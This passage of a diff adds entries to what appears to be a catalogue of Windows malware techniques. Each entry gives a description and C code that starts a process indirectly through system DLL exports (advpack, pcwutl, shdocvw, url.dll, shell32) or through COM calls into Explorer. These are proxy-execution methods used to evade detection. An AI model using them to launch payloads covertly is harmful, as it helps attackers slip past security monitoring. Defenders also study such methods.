+	if (StringCopyW(InfExecutionBuffer, PathToInfFile) == NULL)
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, L",") == NULL)
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, NameOfSection) == NULL)
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, L",") == NULL)
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, L"1") == NULL)
+		goto EXIT_ROUTINE;
+
+	if (StringConcatW(InfExecutionBuffer, L",") == NULL)
+		goto EXIT_ROUTINE;
+
+	if (!SUCCEEDED(LaunchINFSectionW(NULL, NULL, InfExecutionBuffer, 0)))
+		goto EXIT_ROUTINE;
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+	if (hMod)
+		FreeLibrary(hMod);
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                
+88b           d88                       88                                 88      ad88888ba   88               
+888b         d888                ,d     88                                 88     d8"     "8b  ""               
+88`8b       d8'88                88     88                                 88     Y8,                           
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     `Y8aaaaa,    88  8b,     ,d8  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88       `"""""8b,  88   `Y8, ,8P'   
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88             `8b  88     )888(     
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88     Y8a     a8P  88   ,d8" "8b,   
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8      "Y88888P"   88  8P'     `Y8  
+                                                                                                                
+                                                                                                                             
+********************************************************************************************************************************************************************************************	
+
+This code is a function that creates a process from an INF setup command. The function takes two parameters, the path 
+to the INF file and the name of the section to be executed. It returns a boolean value indicating whether the function 
+was successful or not. The function first loads the advpack.dll library using the LoadLibraryW function. It then gets 
+a pointer to the RunSetupCommandW function using the GetProcAddressA function. If the RunSetupCommandW pointer is null, 
+the function exits and returns false. The function then calls the RunSetupCommandW function with the specified 
+parameters. This function runs the specified INF section as a setup command, passing the current directory as the 
+working directory, and sets the flags to run the command quietly and treat it as an INF file. If the RunSetupCommandW 
+function returns a failure code, the function exits and returns false. Otherwise, the function returns true. The 
+advpack.dll library is freed using the FreeLibrary function.
+
+BOOL CreateProcessFromINFSetupCommandW(LPCWSTR PathToInfFile, LPCWSTR NameOfSection)
+{
+	typedef HRESULT(WINAPI* RUNSETUPCOMMANDW)(HWND, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, PHANDLE, DWORD, LPVOID);
+	RUNSETUPCOMMANDW RunSetupCommandW = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+
+	hMod = LoadLibraryW(L"advpack.dll");
+
+	RunSetupCommandW = (RUNSETUPCOMMANDW)GetProcAddressA((DWORD64)hMod, "RunSetupCommandW");
+	if (!RunSetupCommandW)
+		goto EXIT_ROUTINE;
+
+	if (!SUCCEEDED(RunSetupCommandW(NULL, PathToInfFile, NameOfSection, L".", NULL, NULL, RSC_FLAG_INF | RSC_FLAG_QUIET, NULL)))
+		goto EXIT_ROUTINE;
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+	if (hMod)
+		FreeLibrary(hMod);
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                                                 
+88b           d88                       88                                 88      ad88888ba                                                     
+888b         d888                ,d     88                                 88     d8"     "8b                                                    
+88`8b       d8'88                88     88                                 88     Y8,                                                            
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     `Y8aaaaa,     ,adPPYba,  8b       d8   ,adPPYba,  8b,dPPYba,   
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88       `"""""8b,  a8P_____88  `8b     d8'  a8P_____88  88P'   `"8a  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88             `8b  8PP"""""""   `8b   d8'   8PP"""""""  88       88  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88     Y8a     a8P  "8b,   ,aa    `8b,d8'    "8b,   ,aa  88       88  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8      "Y88888P"    `"Ybbd8"'      "8"       `"Ybbd8"'  88       88  
+
+********************************************************************************************************************************************************************************************	
+
+This code is designed to create a process using the IShellDispatch interface. The function takes a single input 
+parameter, BinaryPath, which is a pointer to a wide character string that specifies the path to the executable file 
+to be launched. The code starts by defining several variables and initializing them to default values. It then loads 
+the Shell32.dll library using the TryLoadDllMultiMethodW function. If the function succeeds, it proceeds to retrieve 
+the DllGetClassObject function using the GetProcAddressA function. Next, the code initializes the COM library using 
+the CoInitialize function. It then retrieves an instance of the IClassFactory interface using the DllGetClassObject 
+function. The CreateInstance method of the IClassFactory interface is called to create an instance of the IDispatch 
+interface, which is used to invoke the ShellExecute method. The GetIDsOfNames method of the IDispatch interface is 
+called to retrieve the dispatch identifier (DISPID) for the ShellExecute method. The input parameter to Invoke is
+prepared by allocating a BSTR (a Unicode string) to hold the path to the executable file, and by setting up the 
+DISPPARAMS structure to contain a pointer to the VARIANT structure that holds the path to the executable file. Finally, 
+the Invoke method is called to invoke the ShellExecute method, passing in the DISPID for ShellExecute, the IID_NULL 
+interface identifier, the locale identifier, the type of invocation (DISPATCH_METHOD), the input parameters, and a 
+pointer to the output VARIANT. The function then releases all the resources it acquired before returning an 
+error code (if necessary) or 0 if successful.
+
+DWORD CreateProcessFromIShellDispatchInvokeW(_In_ PWCHAR BinaryPath)
+{
+	HRESULT Result = S_OK;
+	HMODULE hModule = NULL;
+	DLLGETCLASSOBJECT DllGetClassObject = NULL;
+	IClassFactory* ClassFactory = NULL;
+	IDispatch* Dispatch = NULL;
+	DISPID Id = 0;
+	VARIANT Variant = { VT_EMPTY };
+	VARIANT Output = { VT_EMPTY };
+	DISPPARAMS DispatchParameters;
+	LPOLESTR MemberString = (PWCHAR)L"ShellExecute";
+
+	hModule = TryLoadDllMultiMethodW((PWCHAR)L"Shell32.dll");
+	if (hModule == NULL)
+		return GetLastErrorFromTeb();
+
+	DllGetClassObject = (DLLGETCLASSOBJECT)GetProcAddressA((DWORD64)hModule, "DllGetClassObject");
+	if (DllGetClassObject == NULL)
+	{
+		Result = E_FAIL; goto EXIT_ROUTINE;
+	}
+
+	Result = CoInitialize(NULL);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = DllGetClassObject(IClassFactorClsid, IID_IClassFactory, (PVOID*)&ClassFactory);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = ClassFactory->CreateInstance(NULL, IID_IDispatch, (PVOID*)&Dispatch);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = Dispatch->GetIDsOfNames(IID_NULL, &MemberString, 1, LOCALE_USER_DEFAULT, &Id);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Variant.vt = VT_BSTR;
+	Variant.bstrVal = SysAllocString(BinaryPath);
+	DispatchParameters.rgvarg = &Variant;
+	DispatchParameters.rgdispidNamedArgs = NULL;
+	DispatchParameters.cArgs = 1;
+	DispatchParameters.cNamedArgs = 0;
+
+	Result = Dispatch->Invoke(Id, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &DispatchParameters, &Output, NULL, NULL);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+EXIT_ROUTINE:
+
+	if (hModule)
+		FreeLibrary(hModule);
+
+	if (Dispatch)
+		Dispatch->Release();
+
+	if (ClassFactory)
+		ClassFactory->Release();
+
+	if (Variant.bstrVal)
+		SysFreeString(Variant.bstrVal);
+
+	CoUninitialize();
+
+	return Win32FromHResult(Result);
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                                     
+88b           d88                       88                                 88     88888888888  88               88                   
+888b         d888                ,d     88                                 88     88           ""               88            ,d     
+88`8b       d8'88                88     88                                 88     88                            88            88     
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     88aaaaa      88   ,adPPYb,d8  88,dPPYba,  MM88MMM  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88     88"""""      88  a8"    `Y88  88P'    "8a   88     
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88     88           88  8b       88  88       88   88     
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88     88           88  "8a,   ,d88  88       88   88,    
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8     88888888888  88   `"YbbdP"Y8  88       88   "Y888  
+                                                                                                    aa,    ,88                       
+                                                                                                     "Y8bbdP"                                                                     
+********************************************************************************************************************************************************************************************	
+
+This code loads the dynamic link library (DLL) pcwutl.dll and retrieves the address of the function 
+LaunchApplicationW using GetProcAddressA(). If the function is successfully retrieved, it is called with the path to a 
+binary file specified as an argument. This function launches the binary file as a new process. If the DLL is not found 
+or the function is not successfully retrieved, the function sets bFlag to FALSE. Finally, the function returns bFlag to 
+indicate whether the binary file was successfully launched.
+
+BOOL CreateProcessFromPcwUtilW(LPCWSTR PathToBinary)
+{
+	typedef VOID(WINAPI* LAUNCHAPPLICATIONW)(HWND, HINSTANCE, LPCWSTR);
+	LAUNCHAPPLICATIONW LaunchApplicationW = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+
+	hMod = LoadLibraryW(L"pcwutl.dll");
+	if (hMod == NULL)
+		goto EXIT_ROUTINE;
+
+	LaunchApplicationW = (LAUNCHAPPLICATIONW)GetProcAddressA((DWORD64)hMod, "LaunchApplicationW");
+	if (!LaunchApplicationW)
+		goto EXIT_ROUTINE;
+
+	LaunchApplicationW(NULL, NULL, PathToBinary);
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+	if (hMod)
+		FreeLibrary(hMod);
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                             
+88b           d88                       88                                 88     888b      88  88                           
+888b         d888                ,d     88                                 88     8888b     88  ""                           
+88`8b       d8'88                88     88                                 88     88 `8b    88                               
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     88  `8b   88  88  8b,dPPYba,    ,adPPYba,  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88     88   `8b  88  88  88P'   `"8a  a8P_____88  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88     88    `8b 88  88  88       88  8PP"""""""  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88     88     `8888  88  88       88  "8b,   ,aa  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8     88      `888  88  88       88   `"Ybbd8"'  
+                                                                                                                             
+                                                                                                                             
+********************************************************************************************************************************************************************************************	
+
+This code defines a function called CreateProcessFromShdocVwOpenUrlW, which takes a path to a URL file as input and 
+returns a boolean value indicating whether the operation was successful or not. The function first defines a function 
+pointer type called OPENURL that points to a function that takes three parameters: a handle to a window, an instance 
+handle, and a pointer to a character string. It then defines a NULL pointer of this type and a handle to a module. 
+Next, it converts the wide character string PathToUrlFile to a character string using the WCharStringToCharString 
+function and stores it in the ccPathToUrlFile buffer. If this conversion fails, the function immediately returns FALSE.
+The function then loads the shdocvw.dll module using the LoadLibraryW function and checks if it was loaded successfully.
+If the module could not be loaded, the function also returns FALSE. If the module was loaded successfully, the 
+function retrieves the address of the OpenURL function using the GetProcAddressA function and checks if it was 
+retrieved successfully. If it was not, the function returns FALSE. Finally, the function calls the OpenURL function 
+with the NULL handle to the window, NULL instance handle, and the ccPathToUrlFile buffer, and sets the return value to 
+TRUE. In the event of an error at any point in the function, it skips to the EXIT_ROUTINE label, frees the hMod handle 
+if it was loaded, and returns FALSE. Otherwise, it also frees the hMod handle and returns TRUE.
+
+BOOL CreateProcessFromShdocVwOpenUrlW(LPCWSTR PathToUrlFile)
+{
+	typedef VOID(WINAPI* OPENURL)(HWND, HINSTANCE, LPCSTR);
+	OPENURL OpenUrl = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+	CHAR ccPathToUrlFile[MAX_PATH] = { 0 };
+
+	if (WCharStringToCharString(ccPathToUrlFile, (PWCHAR)PathToUrlFile, StringLengthW(PathToUrlFile)) == 0)
+		goto EXIT_ROUTINE;
+
+	hMod = LoadLibraryW(L"shdocvw.dll");
+	if (hMod == NULL)
+		goto EXIT_ROUTINE;
+
+	OpenUrl = (OPENURL)GetProcAddressA((DWORD64)hMod, "OpenURL");
+	if (!OpenUrl)
+		goto EXIT_ROUTINE;
+
+	OpenUrl(NULL, NULL, ccPathToUrlFile);
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+	if (hMod)
+		FreeLibrary(hMod);
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                    
+88b           d88                       88                                 88     888888888888                      
+888b         d888                ,d     88                                 88          88                           
+88`8b       d8'88                88     88                                 88          88                           
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88          88   ,adPPYba,  8b,dPPYba,   
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88          88  a8P_____88  88P'   `"8a  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88          88  8PP"""""""  88       88  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88          88  "8b,   ,aa  88       88  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8          88   `"Ybbd8"'  88       88  
+                                                                                                                    
+                                                                                                                    
+********************************************************************************************************************************************************************************************	
+
+This code defines a function called CreateProcessFromShell32ShellExecRunW that creates a new process by calling the 
+ShellExec_RunDLLW function from the shell32.dll library with the specified command-line parameters. The function 
+starts by defining a function pointer SHELLEXEC_RUNDLLW that represents the ShellExec_RunDLLW function prototype. 
+Then, it declares a few variables: a module handle hMod, which will hold a handle to the loaded DLL; a boolean flag 
+bFlag, which will be set to true if the function executes successfully; and a LPCWSTR variable PathToFile that 
+represents the path to the file to be executed. The function then loads the shell32.dll library by calling the 
+TryLoadDllMultiMethodW function. If the library is loaded successfully, the function uses the GetProcAddressA function 
+to get a pointer to the ShellExec_RunDLLW function. This function takes four parameters: a handle to the parent window 
+of the process being executed (which is set to NULL in this case), an instance handle (also set to NULL), the 
+command-line parameters (represented by the PathToFile variable), and the display options for the new process 
+(set to SW_SHOW in this case). If the ShellExec_RunDLLW function is found and called successfully, the bFlag variable 
+is set to true. Finally, the function returns the value of the bFlag variable. In summary, this function loads the 
+shell32.dll library, gets a pointer to the ShellExec_RunDLLW function, and calls this function with the specified 
+command-line parameters to create a new process.
+
+BOOL CreateProcessFromShell32ShellExecRunW(LPCWSTR PathToFile)
+{
+	typedef VOID(WINAPI* SHELLEXEC_RUNDLLW)(HWND, HINSTANCE, LPCWSTR, INT);
+	SHELLEXEC_RUNDLLW ShellExec_RunDllW = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+
+	hMod = TryLoadDllMultiMethodW((PWCHAR)L"shell32.dll");
+	if (hMod == NULL)
+		goto EXIT_ROUTINE;
+
+	ShellExec_RunDllW = (SHELLEXEC_RUNDLLW)GetProcAddressA((DWORD64)hMod, "ShellExec_RunDLLW");
+	if (!ShellExec_RunDllW)
+		goto EXIT_ROUTINE;
+
+	ShellExec_RunDllW(NULL, NULL, PathToFile, SW_SHOW);
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                                                     
+88b           d88                       88                                 88     88888888888  88                                                    
+888b         d888                ,d     88                                 88     88           88                                                    
+88`8b       d8'88                88     88                                 88     88           88                                                    
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     88aaaaa      88   ,adPPYba,  8b       d8   ,adPPYba,  8b,dPPYba,   
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88     88"""""      88  a8P_____88  `8b     d8'  a8P_____88  88P'   `"8a  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88     88           88  8PP"""""""   `8b   d8'   8PP"""""""  88       88  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88     88           88  "8b,   ,aa    `8b,d8'    "8b,   ,aa  88       88  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8     88888888888  88   `"Ybbd8"'      "8"       `"Ybbd8"'  88       88  
+                                                                                                                                                                       
+********************************************************************************************************************************************************************************************	
+
+The main function, CreateProcessFromShellExecuteInExplorerProcessW, takes a single argument, a pointer to a 
+wide-character string containing the path of the binary to be executed. The first subroutine, 
+UnusedSubroutineGetShellViewForDesktop, initializes an instance of the ShellWindows object and calls its FindWindowSW 
+method to locate the desktop window. It then retrieves a pointer to the active shell view and returns it in the output 
+parameter. The second subroutine, UnusedSubroutineGetShellDispatchFromView, takes a pointer to a shell view object as 
+input and returns a pointer to the shell dispatch object, which can be used to execute shell commands. Finally, the 
+main function calls these two subroutines to obtain a pointer to the shell dispatch object and execute the specified 
+binary using the ShellExecuteW method. The code includes error handling using the HRESULT data type and the "goto" 
+statement to jump to a common error-handling block. It also uses the COM (Component Object Model) library to interact 
+with the Shell API. 
+
+HRESULT UnusedSubroutineGetShellDispatchFromView(IShellView* ShellView, REFIID Riid, PVOID* Dispatch2)
+{
+	HRESULT Result = S_OK;
+	IShellFolderViewDual* ShellFolderDual = NULL;
+	IDispatch* Dispatch = NULL;
+	IDispatch* BackgroundDispatchObject = NULL;
+	*Dispatch2 = NULL;
+
+	Result = ShellView->GetItemObject(SVGIO_BACKGROUND, IID_PPV_ARGS(&BackgroundDispatchObject));
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = BackgroundDispatchObject->QueryInterface(IID_PPV_ARGS(&ShellFolderDual));
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = ShellFolderDual->get_Application(&Dispatch);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = Dispatch->QueryInterface(Riid, Dispatch2);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+EXIT_ROUTINE:
+
+#pragma warning( push )
+#pragma warning( disable : 6001)
+
+	if (BackgroundDispatchObject)
+		BackgroundDispatchObject->Release();
+
+	if (ShellFolderDual)
+		ShellFolderDual->Release();
+
+	if (Dispatch)
+		Dispatch->Release();
+#pragma warning( pop ) 
+
+	return Result;
+}
+
+HRESULT UnusedSubroutineGetShellViewForDesktop(REFIID Riid, PVOID* ShellView)
+{
+	HRESULT Result = S_OK;
+	IShellWindows* Windows = NULL;
+	HWND hWnd;
+	IDispatch* Dispatch = NULL;
+	VARIANT Variant = {};
+	IShellBrowser* Browser = NULL;
+	IShellView* View = NULL;
+	*ShellView = NULL;
+
+	Result = CoCreateInstance(CLSID_ShellWindows, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&Windows));
+	if (!SUCCEEDED(Result))
+		return Result;
+
+	Result = Windows->FindWindowSW(&Variant, &Variant, SWC_DESKTOP, (PLONG)&hWnd, SWFO_NEEDDISPATCH, &Dispatch);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = IUnknown_QueryService(Dispatch, SID_STopLevelBrowser, IID_PPV_ARGS(&Browser));
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = Browser->QueryActiveShellView(&View);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = View->QueryInterface(Riid, ShellView);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+
+EXIT_ROUTINE:
+
+#pragma warning( push )
+#pragma warning( disable : 6001)
+	if (Windows)
+		Windows->Release();
+
+	if (Browser)
+		Browser->Release();
+
+	if (View)
+		View->Release();
+
+	if (Dispatch)
+		Dispatch->Release();
+#pragma warning( pop ) 
+
+	return Result;
+}
+
+DWORD CreateProcessFromShellExecuteInExplorerProcessW(_In_ PWCHAR BinaryPath)
+{
+	HRESULT Result = S_OK;
+	IShellView* ShellView = NULL;
+	IShellDispatch2* Dispatch2 = NULL;
+	BSTR FilePath = NULL;
+	VARIANT Dispose = {};
+
+	Result = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = UnusedSubroutineGetShellViewForDesktop(IID_PPV_ARGS(&ShellView));
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	Result = UnusedSubroutineGetShellDispatchFromView(ShellView, IID_PPV_ARGS(&Dispatch2));
+	if (!SUCCEEDED(Result))
+		goto EXIT_ROUTINE;
+
+	FilePath = SysAllocString(BinaryPath);
+	if (FilePath == NULL)
+		goto EXIT_ROUTINE;
+
+	Result = Dispatch2->ShellExecuteW(FilePath, Dispose, Dispose, Dispose, Dispose);
+
+EXIT_ROUTINE:
+
+#pragma warning( push )
+#pragma warning( disable : 6001)
+	if (ShellView)
+		ShellView->Release();
+
+	if (Dispatch2)
+		Dispatch2->Release();
+#pragma warning( pop ) 
+
+	if (FilePath)
+		SysFreeString(FilePath);
+
+	CoUninitialize();
+
+	return Win32FromHResult(Result);
+}
+
+********************************************************************************************************************************************************************************************	
+                                                                                                                                                        
+88b           d88                       88                                 88     888888888888                             88                           
+888b         d888                ,d     88                                 88          88                                  88                           
+88`8b       d8'88                88     88                                 88          88                                  88                           
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88          88  8b      db      d8   ,adPPYba,  88  8b       d8   ,adPPYba,  
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88          88  `8b    d88b    d8'  a8P_____88  88  `8b     d8'  a8P_____88  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88          88   `8b  d8'`8b  d8'   8PP"""""""  88   `8b   d8'   8PP"""""""  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88          88    `8bd8'  `8bd8'    "8b,   ,aa  88    `8b,d8'    "8b,   ,aa  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8          88      YP      YP       `"Ybbd8"'  88      "8"       `"Ybbd8"'  
+                                                                                                                                                        
+                                                                                                                                                        
+********************************************************************************************************************************************************************************************	
+
+This code defines a function called CreateProcessFromUrlFileProtocolHandlerW that takes a single argument, 
+PathToUrlFile, which is a wide character string pointer. The function first declares a function pointer type, 
+FILEPROTOCOLHANDLERA, which points to a function that takes a HWND, HINSTANCE, LPCSTR, and INT as arguments and 
+returns a HINSTANCE. It then declares some variables, including a flag called bFlag that will be set to TRUE if the 
+function executes successfully. The function then converts the wide character string PathToUrlFile to a character 
+string ccPathToUrlFile using a helper function called WCharStringToCharString. The function then loads the url.dll 
+library and retrieves the address of the FileProtocolHandlerA function using GetProcAddressA. Finally, it calls 
+FileProtocolHandlerA with the converted string ccPathToUrlFile and sets the flag to TRUE if the function executes 
+successfully. If an error occurs at any point, the function jumps to a label called EXIT_ROUTINE, frees the library if 
+it was loaded, and returns FALSE.
+
+BOOL CreateProcessFromUrlFileProtocolHandlerW(LPCWSTR PathToUrlFile)
+{
+	typedef HINSTANCE(WINAPI* FILEPROTOCOLHANDLERA)(HWND, HINSTANCE, LPCSTR, INT);
+	FILEPROTOCOLHANDLERA FileProtocolHandlerA = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+	CHAR ccPathToUrlFile[MAX_PATH] = { 0 };
+
+	if (WCharStringToCharString(ccPathToUrlFile, (PWCHAR)PathToUrlFile, StringLengthW(PathToUrlFile)) == 0)
+		goto EXIT_ROUTINE;
+
+	hMod = LoadLibraryW(L"url.dll");
+	if (hMod == NULL)
+		goto EXIT_ROUTINE;
+
+	FileProtocolHandlerA = (FILEPROTOCOLHANDLERA)GetProcAddressA((DWORD64)hMod, "FileProtocolHandlerA");
+	if (!FileProtocolHandlerA)
+		goto EXIT_ROUTINE;
+
+	FileProtocolHandlerA(NULL, NULL, ccPathToUrlFile, SW_SHOW);
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+	if (hMod)
+		FreeLibrary(hMod);
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************
+                                                                                                                                                                          
+88b           d88                       88                                 88     888888888888  88           88                                                           
+888b         d888                ,d     88                                 88          88       88           ""                ,d                                         
+88`8b       d8'88                88     88                                 88          88       88                             88                                         
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88          88       88,dPPYba,   88  8b,dPPYba,  MM88MMM  ,adPPYba,   ,adPPYba,  8b,dPPYba,   
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88          88       88P'    "8a  88  88P'   "Y8    88    a8P_____88  a8P_____88  88P'   `"8a  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88          88       88       88  88  88            88    8PP"""""""  8PP"""""""  88       88  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88          88       88       88  88  88            88,   "8b,   ,aa  "8b,   ,aa  88       88  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8          88       88       88  88  88            "Y888  `"Ybbd8"'   `"Ybbd8"'  88       88  
+                                                                                                                                                                          
+                                                                                                                                                                          
+********************************************************************************************************************************************************************************************
+
+This code defines a function called CreateProcessFromUrlOpenUrlW that takes a single argument, PathToUrlFile, which is 
+a wide character string pointer. The function first declares a function pointer type, OPENURL, which points to a 
+function that takes a HWND, HINSTANCE, and LPCSTR as arguments and returns VOID. It then declares some variables, 
+including a flag called bFlag that will be set to TRUE if the function executes successfully. The function then 
+converts the wide character string PathToUrlFile to a character string ccPathToUrlFile using a helper function called 
+WCharStringToCharString. The function then loads the url.dll library and retrieves the address of the OpenURL function 
+using GetProcAddressA. Finally, it calls OpenUrl with the converted string ccPathToUrlFile and sets the flag to TRUE if 
+the function executes successfully. If an error occurs at any point, the function jumps to a label called EXIT_ROUTINE, 
+frees the library if it was loaded, and returns FALSE.
+
+BOOL CreateProcessFromUrlOpenUrlW(LPCWSTR PathToUrlFile)
+{
+	typedef VOID(WINAPI* OPENURL)(HWND, HINSTANCE, LPCSTR);
+	OPENURL OpenUrl = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+	CHAR ccPathToUrlFile[MAX_PATH] = { 0 };
+
+	if (WCharStringToCharString(ccPathToUrlFile, (PWCHAR)PathToUrlFile, StringLengthW(PathToUrlFile)) == 0)
+		goto EXIT_ROUTINE;
+
+	hMod = LoadLibraryW(L"url.dll");
+	if (hMod == NULL)
+		goto EXIT_ROUTINE;
+
+	OpenUrl = (OPENURL)GetProcAddressA((DWORD64)hMod, "OpenURL");
+	if (!OpenUrl)
+		goto EXIT_ROUTINE;
+
+	OpenUrl(NULL, NULL, ccPathToUrlFile);
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+	if (hMod)
+		FreeLibrary(hMod);
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************
+                                                                                                                                                                              
+88b           d88                       88                                 88     88888888888                                                                                 
+888b         d888                ,d     88                                 88     88                                               ,d                                         
+88`8b       d8'88                88     88                                 88     88                                               88                                         
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     88aaaaa   ,adPPYba,   88       88  8b,dPPYba,  MM88MMM  ,adPPYba,   ,adPPYba,  8b,dPPYba,   
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88     88"""""  a8"     "8a  88       88  88P'   "Y8    88    a8P_____88  a8P_____88  88P'   `"8a  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88     88       8b       d8  88       88  88            88    8PP"""""""  8PP"""""""  88       88  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88     88       "8a,   ,a8"  "8a,   ,a88  88            88,   "8b,   ,aa  "8b,   ,aa  88       88  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8     88        `"YbbdP"'    `"YbbdP'Y8  88            "Y888  `"Ybbd8"'   `"Ybbd8"'  88       88  
+                                                                                                                                                                              
+                                                                                                                                                                              
+********************************************************************************************************************************************************************************************
+
+The function CreateProcessFromZipfldrRouteCallW attempts to load the zipfldr.dll library, which is the Windows shell 
+extension for handling ZIP files. It then converts the PathToFile parameter, which is a wide character string 
+specifying the path to the file to be opened, into a null-terminated ASCII string called ccPath using the 
+WCharStringToCharString function. Next, the function attempts to obtain the address of the RouteTheCall function from 
